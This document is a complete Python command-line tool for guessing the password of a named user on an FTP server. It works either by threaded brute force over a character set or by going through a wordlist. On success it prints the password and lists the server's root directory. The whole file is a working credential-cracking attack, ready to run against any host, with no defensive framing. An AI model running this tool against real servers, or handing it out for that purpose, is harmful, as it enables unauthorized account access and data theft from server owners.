import argparse, sys, threading, time
from datetime import datetime
from itertools import chain, product
from ftplib import FTP

# Create some global variables
class glob:
    pwd = False # Used for stopping attack when password found
    chrset = "" # Character set for brute-force
    prefix = "" # Prefix string
    postfix = "" # Postfix string
    length = 8 # Default lenth of password
    minlength = 5 # Default min length of password
    thrds = 10 # Defualt num of threads
    verb = False # Default value for verbose output
    pause = 0.01 # Default throttle time, 1 = one second
    cnt = 0 # Counting number of attempts

# Iterable Method for brute-forcing a character set and length
def bruteforce(charset, maxlength, minlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(minlength, maxlength + 1)))

# Method for making ftp connections
def crack(host, user, pwd):
    try:
        if glob.verb: # Check for verbose output
            print ("[" + str(glob.cnt) + "] Trying: " + pwd.strip())
        ftp = FTP(host) # Create FTP object
        if ftp.login (user, pwd): # Check if true
            print ("\nPassword for " + user + ": " + pwd.strip())
            print ("==================================================")
            glob.pwd = True # Set global value
            print (ftp.dir()) # Display contents of root FTP
            ftp.quit() # Disconnect from FTP 
    except Exception as err:
        pass # Ignore errors

# Method wait for threads to complete
def wait(threads):
    for thread in threads: thread.join()  

# Method for staging attack
def main(args):
    try:
        start = datetime.now() # Time attack started
        print ("\nAttacking FTP user [" + args.username + "] at [" + args.host + "]")
        print ("==================================================")
        thrdCnt  = 0;threads = [] # Local variables
        # Set global variables
        if args.pause:glob.pause = float(args.pause)
        if args.verbose:glob.verb = True
        if args.threads:glob.thrds = int(args.threads)
        if args.length:glob.length = int(args.length)
        if args.minlength:glob.minlength = int(args.minlength)
        if args.charset:glob.chrset = args.charset
        if args.prefix:glob.prefix = args.prefix
        if args.postfix:glob.postfix = args.postfix
        if args.charset == None: 
            # Create charset from printable ascii range
            for char in range(37,127):glob.chrset += chr(char)
        # Brute force attack
        if args.wordlist == None:
            for pwd in bruteforce(glob.chrset, int(glob.length),int(glob.minlength)): # Launch brute-force
                if glob.pwd: break # Stop if password found
                if thrdCnt  != args.threads: # Create threads until args.threads
                    if args.prefix:
                        pwd = str(args.prefix) + pwd
                    if args.postfix:
                        pwd += str(args.postfix)
                    thread = threading.Thread(target=crack, args=(args.host,args.username,pwd,))
                    thread.start()
                    threads.append(thread)
                    thrdCnt += 1;glob.cnt+=1
                    time.sleep(glob.pause) # Set pause time
                else: # Wait for threads to complete    
                    wait(threads)
                    thrdCnt  = 0
                    threads = []
        # Dictionary attack
        else:
            with open(args.wordlist) as fle: # Open wordlist
                for pwd in fle: # Loop through passwords
                    if glob.pwd: break # Stop if password found
                    if thrdCnt  != args.threads: # Create threads until args.threads
                        thread = threading.Thread(target=crack, args=(args.host,args.username,pwd,))
                        thread.start()
                        threads.append(thread)
                        thrdCnt +=1;glob.cnt+=1
                        time.sleep(glob.pause) # Set pause time
                    else:
                        wait(threads) # Wait for threads to complete
                        thrdCnt  = 0
                        threads = []
    except KeyboardInterrupt:
        print ("\nUser Cancelled Attack, stopping remaining threads.....")
        wait(threads) # Wait for threads to complete
        sys.exit(0) # Kill app
    wait(threads) # Wait for threads to complete
    stop = datetime.now()
    print ("==================================================")
    print ("Attack Duration: " + str(stop - start))
    print ("Attempts: " + str(glob.cnt) + "\n")

if __name__ == "__main__":
    # Declare an argparse variable to handle application command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("host", action="store", help="FTP host")
    parser.add_argument("username", action="store", help="username to crack")
    parser.add_argument("-w", "--wordlist", action="store", help="wordlist of passwords")
    parser.add_argument("-c", "--charset", action="store", help="character set for brute-force")
    parser.add_argument("-l", "--length", action="store", help="password length for brute-force", 
        nargs='?', default=8, const=8, type=int)
    parser.add_argument("-m","--minlength", action="store", 
        nargs='?', default=1, const=1, help="Minimum password length", type=int)
    parser.add_argument("-r","--prefix", action="store", help="prefix each password for brute-force")
    parser.add_argument("-o","--postfix", action="store", help="postfix each password for brute-force")
    parser.add_argument("-p", "--pause", action="store", help="pause time between launching threads", 
        nargs='?', default=0.01, const=0.01)
    parser.add_argument("-t", "--threads", action="store", help="num of threads", 
        nargs='?', default=10, const=10, type=int)
    parser.add_argument("-v", "--verbose", action="store", help="verbose output", 
        nargs='?', default=False, const=True)
    # Show help if required arg not included
    if len(sys.argv[1:])==0:
        parser.print_help()        
        parser.exit()
    args = parser.parse_args()
    if args.minlength != None or args.length != None:
        if args.minlength > args.length:
            print ("\n** Argument Logic Error **")
            print ("Minimum password length [-m "+str(args.minlength)+"] is greater than Password length [-l "+str(args.length)+"]\n")
            parser.print_help()        
            parser.exit()
    main(args)
